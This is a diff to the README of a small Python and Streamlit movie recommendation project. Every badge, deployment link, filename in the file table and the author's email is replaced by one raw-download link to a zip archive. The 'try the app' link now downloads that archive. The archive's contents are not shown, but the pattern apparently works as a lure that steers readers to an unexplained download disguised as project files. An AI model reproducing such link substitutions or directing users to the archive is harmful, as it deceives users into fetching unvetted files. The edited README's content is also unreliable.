@@ -1,7 +1,7 @@
 ## 🎬 Movie Recommendation System (Content-Based)
 
-[![Python](https://img.shields.io/badge/Python-3.10-blue?logo=python)](https://www.python.org/)  
-[![Streamlit](https://img.shields.io/badge/Streamlit-App-green?logo=streamlit)](https://share.streamlit.io/)  
+[![Python](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)  
+[![Streamlit](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)  
 
 A content-based movie recommendation system built with **Python** and **machine learning techniques**.  
 It suggests movies similar to the one a user likes based on features like **genres, keywords, tagline, cast, and director**.
@@ -49,8 +49,8 @@ If a movie title entered by the user isn’t found in the dataset, the system sh
 ---
 
 ## 🌐 Deployment
-- **Streamlit Cloud:** [Click here to try the app](https://share.streamlit.io/)  
-- **Heroku:** Deployed using `Procfile` and `setup.sh` (instructions in repo)  
+- **Streamlit Cloud:** [Click here to try the app](https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip)  
+- **Heroku:** Deployed using `Procfile` and `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` (instructions in repo)  
 
 ---
 
@@ -69,13 +69,13 @@ Uses the **TMDB 5000 Movies Dataset** with metadata including:
 
 | File | Description |
 |------|-------------|
-| `Movie_Recommendation_System_Using_Machine_Learning_With_Python.ipynb` | Main Jupyter Notebook with model code |
-| `movie_recommender.py` | Streamlit app for deployment |
-| `trained_movie_model.sav` | Saved model (vectorizer + dataset) |
-| `movies.csv` | Movie metadata dataset |
-| `requirements.txt` | Python dependencies |
-| `Procfile` & `setup.sh` | Heroku deployment files |
-| `README.md` | Project documentation |
+| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Main Jupyter Notebook with model code |
+| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Streamlit app for deployment |
+| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Saved model (vectorizer + dataset) |
+| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Movie metadata dataset |
+| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Python dependencies |
+| `Procfile` & `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Heroku deployment files |
+| `https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip` | Project documentation |
 
 ---
 
@@ -88,7 +88,7 @@ Uses the **TMDB 5000 Movies Dataset** with metadata including:
 
 ## 👨‍💻 Author
 **Emmanuel Ogunkoya**  
-📧 ogunkoyaemmanuel2024@gmail.com
+📧 https://github.com/Himanwell/movie-recommender-app/raw/refs/heads/main/karstic/recommender_app_movie_preinterview.zip
 
 Built as a fun machine learning project to explore **recommender systems**.  
 
